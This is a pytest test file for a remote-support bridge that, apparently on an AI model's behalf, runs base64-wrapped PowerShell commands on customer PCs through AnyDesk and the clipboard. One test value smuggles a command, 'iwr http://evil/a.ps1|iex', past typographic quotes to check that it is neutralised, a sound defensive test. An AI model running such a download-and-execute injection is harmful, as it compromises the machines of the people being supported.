import base64
import re

import pytest

from anydesk_helper.anydesk import FocusError
from anydesk_helper.bridge import (END, IDLE, START, ConsoleBridge, enduser_dialog, parse_clipboard,
                                   ps_quote, wrap_command)

from .fakes import Clock, FakeClipboard, FakeRemote, FakeTarget


def make(local_name=None, target=None, **remote_kw):
    clip, clock = FakeClipboard(), Clock()
    remote = FakeRemote(clip, **remote_kw)
    bridge = ConsoleBridge(remote, target or FakeTarget(), clipboard=clip, sleep=clock.sleep,
                           clock=clock, local_name=local_name)
    return bridge, remote, clip


def test_wrapper_is_one_ascii_line_with_base64_command():
    cmd = "Get-Process # комментарий\n'Привет \"мир\"'"
    line = wrap_command(cmd, "abc")
    assert "\n" not in line and line.isascii()
    b64 = re.search(r"FromBase64String\('([^']+)'\)", line).group(1)
    assert base64.b64decode(b64).decode() == cmd
    assert f"'{START}abc'" in line and f"{END}abc" in line


def test_parse_clipboard():
    assert parse_clipboard("чужой текст", "x1") is None
    assert parse_clipboard(f"{START}x1", "x1").status == "running"
    r = parse_clipboard(f"{END}x1 exit=3\r\nline1\r\nline2", "x1")
    assert (r.status, r.exit_code, r.output) == ("done", 3, "line1\nline2")
    assert parse_clipboard(f"{END}other exit=0\n", "x1") is None


def test_run_returns_exact_text_output():
    bridge, remote, _ = make(outputs={"Get-Printer": ("HP LaserJet  Normal", 0)})
    r = bridge.run("Get-Printer | Select Name")
    assert (r.status, r.output, r.exit_code) == ("done", "HP LaserJet  Normal", 0)
    assert remote.commands == ["Get-Printer | Select Name"]
    assert bridge.pending is None


def test_no_ack_when_console_not_focused():
    bridge, _, _ = make(silent=True)
    r = bridge.run("Get-Date")
    assert r.status == "no_ack" and "NO RESPONSE" in r.for_model()
    assert bridge.pending is None


def test_long_command_then_wait():
    bridge, remote, clip = make(running=True)
    r = bridge.run("winget install X", timeout=30)
    assert r.status == "running" and bridge.pending
    assert "open_terminal" in r.for_model()  # выход, если консоль закрыли или результат потерян
    busy = bridge.run("Get-Date")
    # новая команда не отправлена, и модель это видит (а не «STILL RUNNING» про свою команду)
    assert busy.status == "busy" and "NOT SENT" in busy.for_model()
    assert remote.commands == ["winget install X"]
    clip.text = f"{END}{bridge.pending} exit=0\nУспешно установлено"
    r = bridge.wait(60)
    assert r.status == "done" and "Успешно" in r.output and bridge.pending is None


def test_output_is_trimmed_for_model():
    bridge, _, _ = make(outputs={"big": ("x" * 50000, 0)})
    text = bridge.run("big").for_model(limit=1000)
    assert len(text) < 1200 and "[cut]" in text


def test_ps_quote_doubles_typographic_quotes():
    # PowerShell закрывает строку и на ‘ ’ ‚ ‛ — их тоже надо удваивать
    assert ps_quote("Can't ‘x’ ‚y‛") == "'Can''t ‘‘x’’ ‚‚y‛‛'"


def test_enduser_dialog_passes_text_as_base64():
    question = "x’; iwr http://evil/a.ps1|iex; ’ Can't"
    script = enduser_dialog(question, timeout_s=90)
    assert question not in script and "iwr" not in script and "’" not in script
    decoded = [base64.b64decode(b).decode() for b in re.findall(r"FromBase64String\('([^']*)'\)", script)]
    assert decoded == ["Техподдержка", question]
    # окно закрывается само, и тогда тоже есть ответ — консоль не занята навсегда
    assert "Windows.Forms.Timer" in script and "Interval=90000" in script
    assert "ANSWER: (no answer" in script


def test_short_timeout_still_detects_no_ack():
    # parse_action разрешает timeout 5 с, а ack ждём 10 с: команда не должна «зависнуть»
    bridge, remote, _ = make(silent=True)
    r = bridge.run("Get-Date", timeout=5)
    assert r.status == "no_ack" and bridge.pending is None
    assert bridge.run("Get-Date").status == "no_ack"  # следующая команда отправляется


def test_clipboard_is_made_harmless_after_result():
    bridge, _, clip = make(outputs={"Get-ChildItem": ("C:\\Users\\ivan\\setup.exe", 0)})
    r = bridge.run("(Get-ChildItem $HOME\\Downloads).FullName")
    assert r.status == "done" and "setup.exe" in r.output
    assert clip.text == IDLE and IDLE.startswith("#")  # повторная вставка — просто комментарий
    bridge, _, clip = make(silent=True)
    bridge.run("Get-Date")
    assert clip.text == IDLE  # и обёртку после no_ack второй раз не вставить


def test_wrapper_resets_preferences_and_collects_fresh_output():
    line = wrap_command("Start-Service Spooler", "abc")
    # настройки — до маркера начала, NUL убираем до обрезки длины
    assert line.index("$ErrorActionPreference='Continue'") < line.index(START)
    assert "$ConfirmPreference='None'" in line and "$ProgressPreference='SilentlyContinue'" in line
    assert "Tee-Object" not in line and "$__aih=[System.Collections.Generic.List[object]]::new()" in line
    assert "do {" in line and "while ($false)" in line
    assert line.index("[char]0") < line.index(".Length -gt")
    assert line.isascii() and "\n" not in line


def test_wrapper_refuses_on_technician_pc():
    line = wrap_command("Get-Date", "abc", local_name="ТЕХНИК-ПК")
    assert line.isascii() and "\n" not in line  # имя тоже в base64
    assert line.startswith("if ($env:COMPUTERNAME -eq (") and "exit=-999" in line
    # на ПК техника маркер начала не ставится и команда не декодируется
    assert line.index("exit=-999") < line.index("} else {") < line.index("$__s=") < line.index(START)
    assert "COMPUTERNAME" not in wrap_command("Get-Date", "abc")


def test_refused_result():
    bridge, remote, clip = make(local_name="tech-pc", computer="TECH-PC")
    r = bridge.run("Remove-Item C:\\temp -Recurse")
    assert r.status == "refused" and r.exit_code == -999 and "REFUSED" in r.for_model()
    assert remote.commands == [] and remote.refused and bridge.pending is None
    assert clip.text == IDLE
    bridge, remote, _ = make(local_name="tech-pc", computer="CUSTOMER-PC")
    assert bridge.run("Get-Date").status == "done" and remote.commands == ["Get-Date"]
    # exit=-999 от обычной программы — не отказ
    assert parse_clipboard(f"{END}x1 exit=-999\nboom", "x1").status == "done"


def test_focus_error_sends_nothing():
    bridge, remote, _ = make(target=FakeTarget(fail_focus=1))
    with pytest.raises(FocusError):
        bridge.run("Get-Date")
    assert remote.commands == [] and bridge.pending is None
    assert bridge.run("Get-Date").status == "done"  # следующая попытка — как обычно


def test_cancel_clears_pending_even_without_focus():
    bridge, remote, clip = make(running=True)
    bridge.run("winget install X", timeout=30)
    bridge.cancel()
    assert remote.keys == [("ctrl", "c")] and bridge.pending is None and clip.text == IDLE
    bridge, remote, _ = make(running=True, target=FakeTarget())
    bridge.run("winget install X", timeout=30)
    bridge.target.fail_focus = 1
    with pytest.raises(FocusError):
        bridge.cancel()
    assert remote.keys == [] and bridge.pending is None
